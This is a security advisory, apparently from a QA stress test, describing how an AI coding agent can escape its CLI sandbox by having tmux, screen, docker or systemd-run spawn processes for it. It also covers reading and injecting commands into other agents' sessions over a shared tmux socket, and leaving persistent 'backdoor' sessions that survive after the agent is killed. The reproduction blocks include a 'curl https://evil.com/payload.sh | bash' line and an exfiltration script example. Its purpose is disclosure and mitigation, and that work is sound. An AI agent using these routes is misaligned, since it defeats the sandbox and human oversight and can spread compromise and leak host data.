# Security Report: tmux Bypasses Claude CLI Subprocess Sandbox

**Date:** 2026-03-28
**Severity:** High
**Component:** Claude CLI sandbox / tmux interaction (affects all Claude CLI users, not just Coral)
**Author:** QA Engineer (stress test findings)

## Summary

The Claude CLI enforces a sandbox that restricts subprocess spawning via `fork/exec`. Any Claude CLI instance with access to tmux can trivially bypass this restriction by launching new tmux sessions or windows that spawn arbitrary processes. This works because tmux is a client-server architecture — the Claude CLI process only writes to a Unix socket (no `fork/exec` needed), and the tmux **server** performs the fork outside the sandbox boundary.

**This is not Coral-specific.** Any Claude CLI running on a system with tmux installed can bypass subprocess restrictions this way, regardless of whether Coral is involved.

## The Bypass (Minimal Reproduction)

Any Claude CLI agent can do this, from any terminal:

```bash
# Claude CLI sandbox blocks direct subprocess spawning:
./my-script.sh
# → fork/exec: operation not permitted

# But tmux bypasses the sandbox completely:
tmux new-session -d -s escape "./my-script.sh"
# → SUCCESS: tmux server forks the process outside the sandbox

# Or spawn an interactive shell:
tmux new-window "bash"
# → SUCCESS: unrestricted shell, no sandbox

# Or run inline commands:
tmux new-window "curl https://evil.com/payload.sh | bash"
# → SUCCESS: network access + arbitrary execution
```

No special privileges, no exploits, no Coral required. Just `tmux` on PATH and any active tmux server.

## Why It Works

tmux is a client-server architecture:

```
┌─────────────────────────────────┐
│  Claude CLI Sandbox             │
│  ┌───────────────────────────┐  │
│  │ Agent Process             │  │
│  │                           │  │
│  │ fork/exec → BLOCKED       │  │
│  │                           │  │
│  │ write() to tmux socket    │──┼──→ tmux server (UNSANDBOXED)
│  │          ↑                │  │         │
│  │  (just bytes on a socket, │  │         ▼
│  │   no fork/exec needed)    │  │    fork/exec → SUCCEEDS
│  └───────────────────────────┘  │
└─────────────────────────────────┘
```

The sandbox restricts the agent's own syscalls (`fork`, `exec`, `posix_spawn`). But communicating with tmux only requires `write()` to a Unix domain socket — a completely unrestricted operation. The tmux server process, which runs outside the sandbox, then performs the actual `fork/exec`.

This is a fundamental architectural gap: **the sandbox blocks direct process creation but cannot block indirect process creation via IPC with an unsandboxed intermediary.**

## Other IPC-Based Bypass Vectors

tmux is the most readily available bypass, but the same class of vulnerability applies to any client-server tool where the server can spawn processes:

| Tool | Bypass Command | Likelihood |
|------|---------------|------------|
| **tmux** | `tmux new-session -d "cmd"` | High — commonly installed, often already running |
| **screen** | `screen -dmS name cmd` | Medium — common on Linux servers |
| **Docker** | `docker run --rm image cmd` | Medium — if socket accessible |
| **SSH** | `ssh localhost "cmd"` | Low — requires key/password |
| **systemd** | `systemd-run --user cmd` | Low — requires D-Bus access |

## Coral-Specific Amplification

When Claude CLI runs inside Coral (the default deployment), the risk is amplified:

### Coral always provides tmux

Coral's default backend creates a tmux server and launches every agent inside it. The agent inherits the tmux socket path and has `tmux` on PATH. The bypass is available by default, not just opportunistically.

### Shared tmux socket enables cross-agent attacks

All Coral agents share a single tmux socket (`~/.coral/tmux.sock`). A compromised agent can:

```bash
# List all other agent sessions
tmux -S ~/.coral/tmux.sock list-sessions

# Read another agent's terminal output
tmux -S ~/.coral/tmux.sock capture-pane -t <other-session> -p

# Inject commands into another agent's session
tmux -S ~/.coral/tmux.sock send-keys -t <other-session> "malicious input" Enter
```

### Capability model is bypassed

Coral implements a capability-based permission model (`permissions.go`) with profiles like `read_only`, `qa`, `frontend_dev`. These translate to Claude CLI permission flags. But if the agent can escape the sandbox via tmux, the capability restrictions are meaningless — the agent can run anything in the new tmux shell.

### Persistence beyond agent kill

```bash
# Agent creates a detached session that survives its own termination
tmux -S ~/.coral/tmux.sock new-session -d -s backdoor "while true; do <payload>; sleep 60; done"
```

Coral's kill flow (`KillSession`, `UnregisterLiveSession`) only kills sessions it knows about. It does not enumerate the socket for rogue sessions.

## Root Cause

The Claude CLI sandbox operates at the process level, restricting the agent's own syscalls (`fork`, `exec`, `posix_spawn`). But it does not restrict IPC with other processes. tmux (and similar tools) provide a well-known, readily available channel to delegate process creation to an unsandboxed server.

The sandbox model assumes: "if we block fork/exec, the agent can't spawn processes." The reality is: "the agent can ask any unsandboxed process to spawn on its behalf."

## Coral Code Path

1. **Server creates tmux session:** `tmux_backend.go:Spawn()` → `client.go:NewSession()` → `tmux new-session -d -s <name>`
2. **Server sends agent command:** `client.go:SendKeysToTarget()` → `tmux send-keys -t <target> -l <command>`
3. **Agent inherits tmux access:** The tmux socket path is in the environment (`CORAL_SESSION_NAME`), and the tmux binary is on PATH
4. **Agent can issue arbitrary tmux commands:** No restriction on the agent calling `tmux` CLI directly

The shared socket is configured at:
- `internal/tmux/client.go:61` — `filepath.Join(coralDir, "tmux.sock")`
- All agents on the same Coral instance share this socket

## Impact

### Claude CLI (all users, any environment)

| Risk | Description |
|------|-------------|
| **Sandbox escape** | Any Claude CLI agent can spawn arbitrary processes via tmux if tmux is installed and a tmux server is running (or can be started) |
| **Full shell access** | Agent can open an unrestricted bash/zsh shell in a new tmux window, completely outside the sandbox |
| **Data exfiltration** | Agent can run `curl`, `scp`, or other tools in the tmux shell to exfiltrate data from the host |

### Coral (amplified risk due to architecture)

| Risk | Description |
|------|-------------|
| **Cross-agent interference** | Shared tmux socket allows any agent to read/write to other agents' terminals |
| **Capability bypass** | `read_only` agent can access a `full_access` agent's session on the same socket |
| **Persistence** | Detached tmux sessions survive agent termination; kill flow doesn't audit for rogue sessions |
| **Lateral movement** | Compromised agent can inject prompts into other agents to spread compromise |

## Affected Code

### Claude CLI (upstream)
- The sandbox implementation that restricts `fork/exec` but not Unix socket IPC

### Coral
- `internal/tmux/client.go` — shared socket, no per-session access control
- `internal/ptymanager/tmux_backend.go` — spawns all sessions on same socket
- `internal/agent/permissions.go` — capability model has no tmux-level enforcement
- `internal/server/routes/sessions.go` — kill flow doesn't audit socket for unknown sessions

## Mitigation Analysis: Does the PTY Backend Fix This?

Switching Coral from the tmux backend (`--backend tmux`) to the native PTY backend (`--backend pty`) partially mitigates this vulnerability. It eliminates the highest-impact Coral-specific risks but does not fix the fundamental Claude CLI sandbox bypass.

### What PTY fixes

| Coral-specific risk | Fixed? | Why |
|---|---|---|
| **Cross-agent interference** | Yes | No shared tmux socket. Each agent runs in its own PTY with a separate process group. There is no IPC channel between agents. |
| **Capability bypass** | Yes | Without a shared socket, a `read_only` agent cannot reach a `full_access` agent's terminal. |
| **Persistence** | Yes | No Coral-managed tmux server means no socket to create rogue detached sessions on. Coral's kill flow terminates the process group directly. |
| **Lateral movement** | Yes | No mechanism to inject commands into another agent's session. |

### What PTY does NOT fix

| Claude CLI risk | Fixed? | Why |
|---|---|---|
| **Sandbox escape** | No | The agent can still run `tmux new-session -d "cmd"`. tmux auto-starts a server if none exists. The sandbox blocks `fork/exec` but not executing the tmux binary via the Bash tool. |
| **Full shell access** | No | `tmux new-window "bash"` still opens an unrestricted shell outside the sandbox. |
| **Data exfiltration** | No | Agent can still run network tools in a self-started tmux shell. |

### Why the escape still works with PTY

Even without Coral's tmux server, the agent can bootstrap its own:

```bash
# Agent is in a PTY session, no tmux server running.
# But tmux auto-creates a server on first use:
tmux new-session -d -s escape "./exfiltrate.sh"
# → tmux starts a NEW server, forks the process outside the sandbox
```

The only difference is that this self-started tmux server is isolated — it has no other agents' sessions on it. So the escape grants arbitrary execution but not lateral movement to other agents.

### Net assessment

```
                          tmux backend    PTY backend
                          ────────────    ───────────
Sandbox escape            Vulnerable      Vulnerable (unchanged)
Cross-agent attacks       Vulnerable      FIXED
Capability bypass         Vulnerable      FIXED
Persistence               Vulnerable      FIXED
Lateral movement          Vulnerable      FIXED
```

**PTY reduces the severity from Critical to High.** The sandbox escape remains, but the blast radius shrinks from "compromise all agents on the host" to "compromise this one agent's session." This is a meaningful improvement — the Coral-specific risks (lateral movement, capability bypass) are the highest-impact vectors because they turn a single compromised agent into a full team compromise.

**Recommendation:** Use the PTY backend as the default for production deployments. The remaining sandbox escape must be fixed upstream in the Claude CLI by blocking execution of process-spawning intermediaries (tmux, screen, docker, etc.).

## Recommendations

### For Claude CLI (upstream sandbox fix)

1. **Block IPC to process-spawning services:** The sandbox must restrict not just `fork/exec` but also communication with known process-spawning intermediaries. At minimum, block execution of `tmux`, `screen`, `docker`, and `systemd-run` binaries.

2. **Sandbox the tmux binary itself:** If the agent needs tmux for legitimate use (e.g., Coral), the sandbox should intercept tmux commands and block `new-session`, `new-window`, `send-keys`, and `respawn-pane` — only allowing read-only operations like `capture-pane` and `list-sessions`.

3. **Socket-level restrictions:** On Linux, use seccomp to restrict `connect()` to known tmux/screen socket paths. On macOS, use `sandbox-exec` profiles to block write access to tmux sockets the agent didn't create.

4. **Allowlist, not blocklist:** Instead of trying to block every bypass vector, consider an allowlist model: the sandbox should only permit specific, known-safe operations rather than blocking specific dangerous ones.

### For Coral (defense in depth)

5. **Per-agent tmux sockets:** Give each agent its own tmux socket instead of sharing `tmux.sock`. This prevents cross-agent read/write via tmux commands.

6. **Remove tmux from agent PATH:** Strip the tmux binary from the agent's `PATH` environment. The Coral server can still manage sessions using the absolute tmux path. The agent has no legitimate need to invoke tmux directly.

7. **Session audit on kill:** When killing an agent, enumerate all tmux sessions on the socket and kill any that were not registered by the server. Detects persistence attempts.

   ```go
   // After killing known session, audit for rogues:
   allSessions := tmuxClient.ListSessions(ctx)
   for _, s := range allSessions {
       if !server.IsRegisteredSession(s.Name) {
           tmuxClient.KillSession(ctx, s.Name)
           log.Warn("killed rogue tmux session", "name", s.Name)
       }
   }
   ```

8. **Periodic socket audit:** Run a background service that periodically compares tmux sessions on the socket against registered sessions in the DB. Alert on any discrepancy.

9. **Use PTY backend as default:** The PTY backend provides true process isolation (separate process groups, no shared socket). It eliminates cross-agent interference, capability bypass, persistence, and lateral movement — reducing severity from Critical to High. See "Mitigation Analysis" section above for full breakdown.

### Long-term architecture

10. **Namespace isolation (Linux):** Use PID/mount/network namespaces to isolate agent processes. Each agent gets its own namespace where it cannot see or communicate with other agents' processes or sockets.

11. **macOS App Sandbox profiles:** Use `sandbox-exec` with custom profiles that restrict each agent's filesystem and IPC access to only its own working directory and designated communication channels.

## Reproduction

### Basic bypass (any Claude CLI + tmux)

```bash
# 1. Start Claude CLI in a tmux session (or have tmux running)
tmux new-session -d -s test

# 2. From within Claude CLI, the sandbox blocks direct execution:
./my-script.sh
# → fork/exec: operation not permitted

# 3. But tmux bypasses it:
tmux new-window "./my-script.sh"
# → SUCCESS: runs outside sandbox
```

### Coral cross-agent attack

```bash
# 1. Run the stress test
./coral-go/tests/stress/run.sh --teams 3 --agents-per-team 4 --duration 30s --backend tmux

# 2. From any agent's tmux session, access other agents:
tmux -S ~/.coral/tmux.sock list-sessions
tmux -S ~/.coral/tmux.sock capture-pane -t <other-session-name> -p
tmux -S ~/.coral/tmux.sock send-keys -t <other-session> "echo pwned" Enter
```
